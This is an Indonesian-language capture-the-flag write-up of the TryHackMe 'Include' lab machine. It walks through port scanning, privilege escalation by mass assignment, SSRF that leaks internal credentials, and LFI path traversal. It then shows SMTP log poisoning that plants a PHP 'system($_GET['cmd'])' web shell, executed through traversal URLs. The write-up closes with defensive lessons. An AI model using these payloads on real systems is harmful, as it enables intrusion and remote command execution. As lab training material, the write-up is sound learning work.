---
title: "Writeup: Capture The Flag - TryHackMe 'Include'"
date: 2026-03-10
category: Writeup
tags: CTF, HTB/THM, Easy, Linux
author: "Alterpix"
description: Singkat description about the machine.
---
## Reconnaissance

Mulailah dengan scanning port menggunakan Nmap.

```bash
rustscan -a 10.49.148.124 -- -sV -sC

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
...

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:0f:5d:38:2f:0d:50:9d:02:09:a9:43:93:c3:5c:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1GwaHqOs+GkoM0ZQPyViWvVnC4vpqn7/wzEmsgsPctylW3E26N1VIj2BRBNOrix0MQ+hvoa4GQyhaFldNyB44pxO5GNA9wdMQ9jLlDgI480FaptXg4J9hfFGMtV3vchaiO1kVRm+s8w5Ga0FNN4FRnwA0E8WZ1trdV2DiWsDk8+E+TkrgEv7DDNXq+YcHdgleHEhnDME4hHQpLN/hX1Lqi66PqVPlQXSeQFUfAqUlpSNAOOQL2DnAmn/+WmcDID3MVPmYd6uIIcSnbsE3gOryPQeXubYKv8/b0ROZ/wa9v13m9CorjBcNq9DuXyjtKxodOCepzXHQVkmCBP6ngI8PLSmfpdh5drAbQ2PTS8/N9+hLZ5vmbKIacoUcqVvGWYd+gub9tiPDBeCsz792r3+wzwGPYlC8udoaytGUmVLUaGE2Ht3AU27L4SViXgefrKb8+KgEwdvVhuSvKYC14xoBiTcVWqHzLb0/yN2Jx+r9xu1gFdtMyTI3sBEjA0TOo/k=
|   256 5e:5a:81:9c:c1:4f:d3:aa:93:9c:98:d2:25:4e:50:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEr2gOH0W+Ap+uUGmvTSN7dTpT8lph8yvoLoE5Tf7MIMfzIN7QzSVVarG3DqkS7FXTnROsPEtfbjf/npNcSKdmc=
|   256 f0:15:b9:05:f5:e3:98:ad:e1:ad:96:a8:c8:cb:a1:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMNwMWy65FSL0kzNLi9YWo5DJfMlrccbITO8VxrfRXJa
25/tcp    open  smtp     syn-ack ttl 62 Postfix smtpd
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:     05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
| SHA-1:   a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
| SHA-256: 3b59 9d8c f354 edd5 b038 ab62 78a5 643f f059 9d57 e493 a662 5acb 8f6a a181 9956
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
110/tcp   open  pop3     syn-ack ttl 62 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL RESP-CODES AUTH-RESP-CODE TOP UIDL CAPA PIPELINING STLS
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:     05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
| SHA-1:   a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
| SHA-256: 3b59 9d8c f354 edd5 b038 ab62 78a5 643f f059 9d57 e493 a662 5acb 8f6a a181 9956
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
143/tcp   open  imap     syn-ack ttl 62 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:     05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
| SHA-1:   a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
| SHA-256: 3b59 9d8c f354 edd5 b038 ab62 78a5 643f f059 9d57 e493 a662 5acb 8f6a a181 9956
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_imap-capabilities: LOGINDISABLEDA0001 capabilities more LOGIN-REFERRALS ID have post-login LITERAL+ listed IMAP4rev1 Pre-login STARTTLS OK IDLE SASL-IR ENABLE
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap syn-ack ttl 62 Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:     05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
| SHA-1:   a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
| SHA-256: 3b59 9d8c f354 edd5 b038 ab62 78a5 643f f059 9d57 e493 a662 5acb 8f6a a181 9956
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_imap-capabilities: more capabilities AUTH=LOGINA0001 LOGIN-REFERRALS ID have post-login LITERAL+ listed IMAP4rev1 Pre-login AUTH=PLAIN OK IDLE SASL-IR ENABLE
995/tcp   open  ssl/pop3 syn-ack ttl 62 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN LOGIN) RESP-CODES AUTH-RESP-CODE TOP UIDL CAPA PIPELINING USER
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:     05c8 4559 9811 a54f 9c53 b3ee f6ad f0fd
| SHA-1:   a24d 7a7f 9ac1 8045 5c5f 5b7c 721a 4e21 0599 ed7c
| SHA-256: 3b59 9d8c f354 edd5 b038 ab62 78a5 643f f059 9d57 e493 a662 5acb 8f6a a181 9956
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
4000/tcp  open  http     syn-ack ttl 62 Node.js (Express middleware)
|_http-title: Sign In
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
50000/tcp open  http     syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: System Monitoring Portal
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

...
```

| **Port**    | **Service** | **Version**       | **Keterangan**                                                                                 |
| ----------- | ----------- | ----------------- | ---------------------------------------------------------------------------------------------- |
| **22**      | SSH         | OpenSSH 8.2p1     | Digunakan untuk remote administration.                                                         |
| **25**      | SMTP        | Postfix smtpd     | Mail Transfer Agent. Perlu dicek apakah mengizinkan _Open Relay_ atau enumerasi user (`VRFY`). |
| **110/995** | POP3/S      | Dovecot pop3d     | Protokol pengambilan email (cleartext & SSL).                                                  |
| **143/993** | IMAP/S      | Dovecot imapd     | Protokol sinkronisasi email (cleartext & SSL).                                                 |
| **4000**    | HTTP        | Node.js (Express) | Aplikasi web kustom, menampilkan halaman "Sign In".                                            |
| **50000**   | HTTP        | Apache 2.4.41     | "System Monitoring Portal", menggunakan PHP (`PHPSESSID`).                                     |


## Enumeration

#### Email Services (Port 25, 110, 143, 993, 995)
semua infrastruktur mail server berjalan secara local.

#### Web Application - Port 4000
terdapat informasi login default dan berhasil melakukan login.
![[Pasted image 20260310212401.png]]
![[Pasted image 20260310212443.png]]
#### System Monitoring Portal - Port 50000
Terdapat halaman login monitoring.
![[Pasted image 20260310212705.png]]
![[Pasted image 20260310212722.png]]

## Insecure parameter binding

![[Pasted image 20260310213308.png]]
![[Pasted image 20260310213334.png]]
Age bisa dimodifikasi. Sekarang aku mencoba memodifikasi isAdmin untuk mengubah hak akses profil guest.
![[Pasted image 20260310213513.png]]
setelah aku ubah muncul menu baru di sisi kanan atas, yaitu API dan setings.

## SSRF (Server Side Request Forgery)
Pada settings terdapat form untuk mengisi banner.

Aku mencoba apakah rentan terhadap SSRF dengan memasukan URL dari http server milikku.
```bash
python -m http.server 6000       
Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
10.49.148.128 - - [10/Mar/2026 21:41:31] "GET / HTTP/1.1" 200 -
```
![[Pasted image 20260310214430.png]]
form itu ternyata rentan karena bisa melakukan request ke url lain tanpa membatasi request tersebut untuk URL tertentu saja. 
![[Pasted image 20260310214804.png]]
pada menu API terdapat URL localhost 127.0.0.1 untuk request Internal API dan Get Admins API, sekarang kita coba melakukan request kesana.
![[Pasted image 20260310214946.png]]
Ketika aku melakukan request ke 2 Url API tadi, form mengembalikan nilai base64 yang akan saya decode.
```bash
echo "eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9" | base64 -d

{"secretKey":"[REDACTED]","confidentialInfo":"This is very confidential information. Handle with care."} 
```

```bash
echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 -d

{"ReviewAppUsername":"admin","ReviewAppPassword":"[REDACTED]","SysMonAppUsername":"administrator","SysMonAppPassword":"[REDACTED]"}
```
Terdapat Kredensial yang bisa dimanfaatkan untuk login di port 50000.
![[Pasted image 20260310215631.png]]
Dan flag pertama ada disana.

## LFI (Local File Inclution)
Pada page source web  monitoring terdapat url profil yang menggunakan parameter get untuk mendapatkan gambar tersebut.
![[Pasted image 20260310215838.png]]
Aku mencoba untuk melakukan fuzzing untuk mencari /etc/passwd directory nya dengan payload dari seclist [Disini](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).
![[Pasted image 20260310220032.png]]
![[Pasted image 20260310220356.png]]
Payload untuk ath ke /etc/passwd sudah ditemukan. 
## Exploitation LFI to RCE
Sebelumnya saya melihat ada mail server yang berjalan.
Saya akan mencoba mengakses mail server dengan telnet dan mengirim email ke user joshua(User ditemukan dalam /etc/passwd tadi) untuk triger log yang nanti akan saya akses file log nya menggunakan kerentanan LFI tadi.
```bash
telnet 10.49.148.128 25

Trying 10.49.148.128...
Connected to 10.49.148.128.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
HELO test
250 mail.filepath.lab
MAIL FROM: paperalt@thm.com
250 2.1.0 Ok
RCPT TO: joshua
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test
From: paperalt
To: joshua
.
250 2.0.0 Ok: queued as 0D816FB56B
```
![[Pasted image 20260310222034.png]]
File log berhasil diakses dan informasi dari interaksi ku ke mail server masuk ke log.
Sekarang saya akan mencoba membuat payload PHP sebagai RCE melalui interaksi ke mail server dengan triger error ke "RCPT"
```php
<?php system($_GET['cmd']); ?>
```

```bash
telnet 10.49.148.128 25

Trying 10.49.148.128...
Connected to 10.49.148.128.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
HELO test2
250 mail.filepath.lab
MAIL FROM: paperalt@thm.com
250 2.1.0 Ok
RCPT TO: <?php system($_GET['cmd']); ?>
501 5.1.3 Bad recipient address syntax
```
Payload berhasil masuk setelah aku melakukan request ulang ke burpsuite repeater
![[Pasted image 20260310223601.png]]

setelah saya mengeksekusi command pwd, respon menunjukkan sekarang di directory /var/www/html
```url
http://10.49.148.128:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=pwd
```
![[Pasted image 20260310223807.png]]
Sekarang saya mencoba mencari secret file di directory itu.
```url
http://10.49.148.128:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=ls
```
![[Pasted image 20260310224345.png]]
```url
http://10.49.148.128:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=cat%[REDACTED].txt
```
![[Pasted image 20260310224459.png]]
Flag kedua berhasil didapat.

## Lessons Learned

1. **Validasi Parameter di Sisi Server (Mass Assignment)**: Jangan pernah mempercayai semua field yang dikirim klien secara langsung ke model/database. Parameter seperti `isAdmin` seharusnya tidak bisa dimodifikasi oleh pengguna biasa. Gunakan *allowlist* field yang boleh diubah (_permitted attributes_) dan selalu validasi otorisasi di sisi server, bukan hanya di UI.

2. **Batasi Request SSRF dengan Allowlist URL**: Form yang menerima URL sebagai input harus divalidasi ketat menggunakan *allowlist* domain/IP yang diizinkan. Tanpa pembatasan ini, penyerang bisa memanfaatkannya untuk menjangkau layanan internal (seperti API `127.0.0.1`) yang seharusnya tidak bisa diakses dari luar, termasuk mengekstrak kredensial tersembunyi.

3. **Hindari Penggunaan Input Pengguna Langsung di `include()` / Parameter File**: Kerentanan LFI terjadi karena parameter `img` di URL digunakan langsung untuk membaca file dari sistem. Selalu gunakan *whitelist* nama file yang diizinkan, atau mapping ID ke path yang sudah ditentukan, sehingga penyerang tidak bisa menggunakan path traversal (`....//....//`) untuk keluar dari direktori yang seharusnya.

4. **Log Sanitization untuk Mencegah Log Poisoning → RCE**: File log (seperti `/var/log/mail.log`) menampung data mentah dari koneksi eksternal tanpa sanitasi. Ketika dikombinasikan dengan LFI, log yang berisi payload PHP bisa dieksekusi oleh server. Pastikan log di-*escape* dengan benar, dan akses file log tidak pernah bisa dicapai melalui parameter yang dapat dikontrol pengguna.
